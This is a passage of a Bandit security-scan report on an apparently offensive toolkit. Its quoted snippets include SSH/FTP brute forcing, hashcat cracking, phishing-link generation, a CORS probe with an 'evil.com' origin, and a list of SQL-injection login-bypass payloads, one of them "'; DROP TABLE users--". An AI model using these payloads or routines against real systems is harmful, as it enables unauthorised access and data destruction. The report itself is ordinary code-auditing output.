+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/recon/cloud_enum.py:72:8
+71	                log_debug(f"S3 bucket {bucket} exists but is private")
+72	        except:
+73	            pass
+74	
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/recon/cloud_enum.py:89:8
+88	                        log_success(f"🔥 Found Azure Blob: {url}")
+89	        except:
+90	            pass
+91	
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/recon/cloud_enum.py:105:8
+104	                    log_success(f"🔥 Found GCP Storage: {url}")
+105	        except:
+106	            pass
+107	
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/recon/cloud_exploit.py:54:16
+53	                        )
+54	                except:
+55	                    pass
+56	
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/recon/cloud_exploit.py:79:12
+78	                    )
+79	            except:
+80	                pass
+81	
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/recon/cloud_exploit.py:100:12
+99	                    )
+100	            except:
+101	                pass
+102	
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/recon/cloud_scanner.py:35:12
+34	                    )
+35	            except:
+36	                pass
+37	
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/recon/cloud_scanner.py:51:8
+50	                )
+51	        except:
+52	            pass
+53	
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/recon/cloud_scanner.py:63:8
+62	                )
+63	        except:
+64	            pass
+65	
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/recon/social_eng.py:23:26
+22	        suffixes = [".com", ".net", ".org", ".info"]
+23	        link = f"https://{random.choice(prefixes)}-{domain.replace('.', '-')}{random.choice(suffixes)}"
+24	        self.results["phishing_links"] = [link]
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/recon/social_eng.py:23:78
+22	        suffixes = [".com", ".net", ".org", ".info"]
+23	        link = f"https://{random.choice(prefixes)}-{domain.replace('.', '-')}{random.choice(suffixes)}"
+24	        self.results["phishing_links"] = [link]
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/recon/social_eng.py:40:8
+39	                log_success(f"Found {len(emails)} leaked emails")
+40	        except:
+41	            pass
+42	
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/recon/takeover.py:78:20
+77	                            return result
+78	                    except:
+79	                        pass
+80	        except dns.resolver.NoAnswer:
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/recon/takeover_advanced.py:84:16
+83	                        log_success(f"🔥 Takeover possible: {subdomain} -> {cname}")
+84	                except:
+85	                    pass
+86	
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/recon/threat_intel.py:33:8
+32	                log_success("VirusTotal check completed")
+33	        except:
+34	            pass
+35	
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/recon/threat_intel.py:49:8
+48	                log_success("Shodan check completed")
+49	        except:
+50	            pass
+51	
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/recon/threat_intel.py:67:8
+66	                log_success("AbuseIPDB check completed")
+67	        except:
+68	            pass
+69	
+
+--------------------------------------------------
+>> Issue: [B404:blacklist] Consider possible security implications associated with the subprocess module.
+   Severity: Low   Confidence: High
+   CWE: CWE-78 (https://cwe.mitre.org/data/definitions/78.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_imports.html#b404-import-subprocess
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/reporting/pdf_report.py:35:12
+34	        try:
+35	            import subprocess
+36	
+
+--------------------------------------------------
+>> Issue: [B607:start_process_with_partial_path] Starting a process with a partial executable path
+   Severity: Low   Confidence: High
+   CWE: CWE-78 (https://cwe.mitre.org/data/definitions/78.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b607_start_process_with_partial_path.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/reporting/pdf_report.py:37:12
+36	
+37	            subprocess.run(
+38	                ["wkhtmltopdf", html_file, self.output_file],
+39	                capture_output=True,
+40	                timeout=30,
+41	            )
+42	            os.remove(html_file)
+
+--------------------------------------------------
+>> Issue: [B603:subprocess_without_shell_equals_true] subprocess call - check for execution of untrusted input.
+   Severity: Low   Confidence: High
+   CWE: CWE-78 (https://cwe.mitre.org/data/definitions/78.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b603_subprocess_without_shell_equals_true.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/reporting/pdf_report.py:37:12
+36	
+37	            subprocess.run(
+38	                ["wkhtmltopdf", html_file, self.output_file],
+39	                capture_output=True,
+40	                timeout=30,
+41	            )
+42	            os.remove(html_file)
+
+--------------------------------------------------
+>> Issue: [B402:blacklist] A FTP-related module is being imported.  FTP is considered insecure. Use SSH/SFTP/SCP or some other encrypted protocol.
+   Severity: High   Confidence: High
+   CWE: CWE-319 (https://cwe.mitre.org/data/definitions/319.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_imports.html#b402-import-ftplib
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/scan/bruteforce.py:4:0
+3	
+4	import ftplib
+5	import socket
+
+--------------------------------------------------
+>> Issue: [B507:ssh_no_host_key_verification] Paramiko call with policy set to automatically trust the unknown host key.
+   Severity: High   Confidence: Medium
+   CWE: CWE-295 (https://cwe.mitre.org/data/definitions/295.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b507_ssh_no_host_key_verification.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/scan/bruteforce.py:40:12
+39	            client = paramiko.SSHClient()
+40	            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+41	            client.connect(
+
+--------------------------------------------------
+>> Issue: [B321:blacklist] FTP-related functions are being called. FTP is considered insecure. Use SSH/SFTP/SCP or some other encrypted protocol.
+   Severity: High   Confidence: High
+   CWE: CWE-319 (https://cwe.mitre.org/data/definitions/319.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b321-ftplib
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/scan/bruteforce.py:60:18
+59	        try:
+60	            ftp = ftplib.FTP(self.target)
+61	            ftp.login(username, password)
+
+--------------------------------------------------
+>> Issue: [B404:blacklist] Consider possible security implications associated with the subprocess module.
+   Severity: Low   Confidence: High
+   CWE: CWE-78 (https://cwe.mitre.org/data/definitions/78.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_imports.html#b404-import-subprocess
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/scan/host_discovery.py:6:0
+5	import socket
+6	import subprocess
+7	import threading
+
+--------------------------------------------------
+>> Issue: [B603:subprocess_without_shell_equals_true] subprocess call - check for execution of untrusted input.
+   Severity: Low   Confidence: High
+   CWE: CWE-78 (https://cwe.mitre.org/data/definitions/78.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b603_subprocess_without_shell_equals_true.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/scan/host_discovery.py:26:21
+25	            cmd = ["ping", "-c", "1", "-W", "1", str(ip)]
+26	            result = subprocess.run(
+27	                cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2
+28	            )
+29	            if result.returncode == 0:
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/scan/host_discovery.py:55:12
+54	                    return True
+55	            except:
+56	                pass
+57	        return False
+
+--------------------------------------------------
+>> Issue: [B404:blacklist] Consider possible security implications associated with the subprocess module.
+   Severity: Low   Confidence: High
+   CWE: CWE-78 (https://cwe.mitre.org/data/definitions/78.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_imports.html#b404-import-subprocess
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/scan/password_crack.py:5:0
+4	import hashlib
+5	import subprocess
+6	
+
+--------------------------------------------------
+>> Issue: [B607:start_process_with_partial_path] Starting a process with a partial executable path
+   Severity: Low   Confidence: High
+   CWE: CWE-78 (https://cwe.mitre.org/data/definitions/78.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b607_start_process_with_partial_path.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/scan/password_crack.py:53:21
+52	        try:
+53	            result = subprocess.run(
+54	                ["hashcat", "-m", hash_type, hash_value, "wordlists/rockyou.txt"],
+55	                capture_output=True,
+56	                text=True,
+57	                timeout=10,
+58	            )
+59	            if result.returncode == 0:
+
+--------------------------------------------------
+>> Issue: [B603:subprocess_without_shell_equals_true] subprocess call - check for execution of untrusted input.
+   Severity: Low   Confidence: High
+   CWE: CWE-78 (https://cwe.mitre.org/data/definitions/78.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b603_subprocess_without_shell_equals_true.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/scan/password_crack.py:53:21
+52	        try:
+53	            result = subprocess.run(
+54	                ["hashcat", "-m", hash_type, hash_value, "wordlists/rockyou.txt"],
+55	                capture_output=True,
+56	                text=True,
+57	                timeout=10,
+58	            )
+59	            if result.returncode == 0:
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/api_scanner.py:37:12
+36	                        return
+37	            except:
+38	                pass
+39	
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/api_scanner.py:54:12
+53	                    return
+54	            except:
+55	                pass
+56	
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/api_scanner.py:77:12
+76	                    )
+77	            except:
+78	                pass
+79	
+
+--------------------------------------------------
+>> Issue: [B113:request_without_timeout] Call to requests without timeout
+   Severity: Medium   Confidence: Low
+   CWE: CWE-400 (https://cwe.mitre.org/data/definitions/400.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b113_request_without_timeout.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/api_scanner.py:82:19
+81	        try:
+82	            resp = requests.get(self.target, headers={"Origin": "https://evil.com"})
+83	            if "access-control-allow-origin" in resp.headers:
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/api_scanner.py:90:8
+89	                    )
+90	        except:
+91	            pass
+92	
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/collaborator/blind_xss.py:26:23
+25	        """Generate a unique collaborator ID"""
+26	        return "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
+27	
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/graphql.py:206:12
+205	                        log_success(f"Found GraphQL endpoint (with errors): {url}")
+206	            except:
+207	                pass
+208	
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/graphql.py:225:16
+224	                            )
+225	                except:
+226	                    pass
+227	
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/graphql.py:372:8
+371	                    return True
+372	        except:
+373	            pass
+374	        return False
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/jwt_oauth.py:47:12
+46	                return secret
+47	            except:
+48	                pass
+49	        return None
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: '<input[^>]*name=["\']([^"\']*)["\'][^>]*type=["\']password["\'][^>]*>'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:121:12
+120	            "username": r'<input[^>]*name=["\']([^"\']*)["\'][^>]*type=["\'](text|email|tel)["\'][^>]*>',
+121	            "password": r'<input[^>]*name=["\']([^"\']*)["\'][^>]*type=["\']password["\'][^>]*>',
+122	            "submit": r'<input[^>]*type=["\']submit["\'][^>]*>',
+123	        }
+124	
+125	    def _load_internal_payloads(self) -> List[Dict]:
+126	        """Internal payloads for login bypass"""
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: '' OR '1'='1'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:131:40
+130	        sqli_payloads = [
+131	            {"username": "' OR '1'='1", "password": "' OR '1'='1", "type": "sqli"},
+132	            {"username": "' OR 1=1--", "password": "' OR 1=1--", "type": "sqli"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: '' OR 1=1--'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:132:39
+131	            {"username": "' OR '1'='1", "password": "' OR '1'='1", "type": "sqli"},
+132	            {"username": "' OR 1=1--", "password": "' OR 1=1--", "type": "sqli"},
+133	            {"username": "' OR 1=1#", "password": "' OR 1=1#", "type": "sqli"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: '' OR 1=1#'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:133:38
+132	            {"username": "' OR 1=1--", "password": "' OR 1=1--", "type": "sqli"},
+133	            {"username": "' OR 1=1#", "password": "' OR 1=1#", "type": "sqli"},
+134	            {"username": "admin'--", "password": "password", "type": "sqli"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:134:37
+133	            {"username": "' OR 1=1#", "password": "' OR 1=1#", "type": "sqli"},
+134	            {"username": "admin'--", "password": "password", "type": "sqli"},
+135	            {"username": "admin'#", "password": "password", "type": "sqli"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:135:36
+134	            {"username": "admin'--", "password": "password", "type": "sqli"},
+135	            {"username": "admin'#", "password": "password", "type": "sqli"},
+136	            {"username": "admin' OR '1'='1", "password": "password", "type": "sqli"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:136:45
+135	            {"username": "admin'#", "password": "password", "type": "sqli"},
+136	            {"username": "admin' OR '1'='1", "password": "password", "type": "sqli"},
+137	            {"username": "admin' OR 1=1--", "password": "password", "type": "sqli"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:137:44
+136	            {"username": "admin' OR '1'='1", "password": "password", "type": "sqli"},
+137	            {"username": "admin' OR 1=1--", "password": "password", "type": "sqli"},
+138	            {"username": "admin' OR 1=1#", "password": "password", "type": "sqli"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:138:43
+137	            {"username": "admin' OR 1=1--", "password": "password", "type": "sqli"},
+138	            {"username": "admin' OR 1=1#", "password": "password", "type": "sqli"},
+139	            {"username": "admin' AND '1'='1", "password": "password", "type": "sqli"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:139:46
+138	            {"username": "admin' OR 1=1#", "password": "password", "type": "sqli"},
+139	            {"username": "admin' AND '1'='1", "password": "password", "type": "sqli"},
+140	            {"username": "admin' AND 1=1--", "password": "password", "type": "sqli"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:140:45
+139	            {"username": "admin' AND '1'='1", "password": "password", "type": "sqli"},
+140	            {"username": "admin' AND 1=1--", "password": "password", "type": "sqli"},
+141	            {"username": "admin' AND 1=1#", "password": "password", "type": "sqli"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:141:44
+140	            {"username": "admin' AND 1=1--", "password": "password", "type": "sqli"},
+141	            {"username": "admin' AND 1=1#", "password": "password", "type": "sqli"},
+142	            {
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:144:16
+143	                "username": "' UNION SELECT NULL--",
+144	                "password": "password",
+145	                "type": "sqli",
+146	            },
+147	            {
+148	                "username": "' UNION SELECT NULL,NULL--",
+149	                "password": "password",
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:149:16
+148	                "username": "' UNION SELECT NULL,NULL--",
+149	                "password": "password",
+150	                "type": "sqli",
+151	            },
+152	            {
+153	                "username": "'; DROP TABLE users--",
+154	                "password": "password",
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:154:16
+153	                "username": "'; DROP TABLE users--",
+154	                "password": "password",
+155	                "type": "sqli",
+156	            },
+157	            {"username": "1' OR '1'='1", "password": "1' OR '1'='1", "type": "sqli"},
+158	            {"username": "1' OR 1=1--", "password": "1' OR 1=1--", "type": "sqli"},
+159	            {"username": "1' OR 1=1#", "password": "1' OR 1=1#", "type": "sqli"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: '1' OR '1'='1'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:157:41
+156	            },
+157	            {"username": "1' OR '1'='1", "password": "1' OR '1'='1", "type": "sqli"},
+158	            {"username": "1' OR 1=1--", "password": "1' OR 1=1--", "type": "sqli"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: '1' OR 1=1--'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:158:40
+157	            {"username": "1' OR '1'='1", "password": "1' OR '1'='1", "type": "sqli"},
+158	            {"username": "1' OR 1=1--", "password": "1' OR 1=1--", "type": "sqli"},
+159	            {"username": "1' OR 1=1#", "password": "1' OR 1=1#", "type": "sqli"},
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: '1' OR 1=1#'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:159:39
+158	            {"username": "1' OR 1=1--", "password": "1' OR 1=1--", "type": "sqli"},
